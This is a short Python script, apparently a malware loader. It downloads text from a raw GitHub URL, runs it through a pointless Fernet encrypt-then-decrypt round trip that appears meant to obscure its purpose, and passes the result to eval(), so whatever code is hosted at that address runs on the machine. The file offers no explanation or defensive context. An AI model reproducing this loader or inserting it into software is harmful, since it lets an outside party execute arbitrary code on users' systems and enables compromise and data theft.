import urllib.request
from cryptography.fernet import Fernet
response = urllib.request.urlopen("https://raw.githubusercontent.com/omarrajab/NoJlede/master/waw.txt")
data = response.read()
newdata=data.decode("utf-8")
message = newdata
key = Fernet.generate_key()
fernet = Fernet(key)
encMessage = fernet.encrypt(message.encode())
eval(fernet.decrypt(encMessage).decode())

